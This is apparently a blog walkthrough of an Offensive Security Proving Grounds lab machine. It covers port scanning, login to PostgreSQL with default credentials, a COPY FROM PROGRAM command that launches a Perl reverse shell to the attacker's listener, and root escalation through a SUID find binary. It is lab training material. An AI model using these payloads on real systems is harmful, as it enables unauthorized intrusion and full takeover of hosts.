---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a simple `nmap` scan to identify the attack surface.

## port scan
```bash
$ nmap -p- -sV 192.168.183.47
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 14:41 EST
Nmap scan report for 192.168.183.47
Host is up (0.023s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.7
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
```

## port 21 (`FTP`)
> No `anonymous` access allowed.
{: .prompt-danger }

## port 22 (`SSH`)
> No weak passwords identified for `root` account or remote `root` login disabled.
{: .prompt-danger }

## port 80 (web server)
> Simple web site without interactive content.  
> `gobuster` does not reveal anything useful.
{: .prompt-danger }

## port 5437 (`postgres`)
> Uses weak credentials `postgres:postgres`.
{: .prompt-info }

---

# exploitation
## weak credentials postgres
Logging in to console with `psql` and credentials `postgres:postgres`.

```bash
$ psql -h 192.168.183.47 -p 5437 -U postgres postgres
Password for user postgres: 
psql (14.1 (Debian 14.1-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(3 rows)
```

## getting remote code execution
Researching on `Google` for `RCE` with `postgres` leads to the following [`medium`](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) blog post.  
The plan is to spawn a reverse shell to send commands to the target interactively.

### start listener on attacker machine
```bash
$ nc -lvp 80                                           
listening on [any] 80 ...
```

### send commands to `postgres` console
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

### catch reverse connection from target
```bash
$ nc -lvp 80                                           
listening on [any] 80 ...
192.168.183.47: inverse host lookup failed: Unknown host
connect to [192.168.49.183] from (UNKNOWN) [192.168.183.47] 40076
whoami
postgres
```

> Code Execution!
{: .prompt-info }

---

# post exploitation

## first flag
```bash
cat /home/wilson/local.txt
b******************************3
```

## privilege escalation
Identify `SUID` binaries which might be useful

```bash
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwxr-sr-x 1 root ssh 321672 Jan 31  2020 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 34896 Jan  7  2019 /usr/bin/fusermount
-rwxr-sr-x 1 root mail 18944 Dec  3  2017 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root crontab 43568 Oct 11  2019 /usr/bin/crontab
-rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /usr/sbin/unix_chkpwd
```

`find` can be used to get `root` privileges. ([gtfobins](https://gtfobins.github.io/gtfobins/find/#suid)).

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
```

> Root! Whoop whoop!
{: .prompt-info }

## second flag

```
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt
5******************************e
```

Pwned! <@:-)
